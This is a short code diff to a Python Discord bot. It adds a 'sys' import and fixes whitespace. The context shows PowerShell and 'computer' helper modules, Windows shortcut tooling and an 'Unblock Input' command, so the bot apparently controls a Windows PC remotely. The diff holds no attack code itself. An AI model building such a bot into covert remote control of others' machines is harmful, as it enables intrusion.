@@ -2,6 +2,7 @@ import discord
 import os
 import libs.computer as pc
 import libs.powershell as pw
+import sys
 from shutil import copy;
 import winshell
 from win32com.client import Dispatch
@@ -228,7 +229,7 @@ async def on_message(message):
             return
         embed = discord.Embed(title="Unblock Input", description="Input unblocked.", color=0x00ff00)
         await message.channel.send(embed=embed)
-        
+
 token = sys.argv[1]
 client.run(token)
 #use py main.py <token> to run
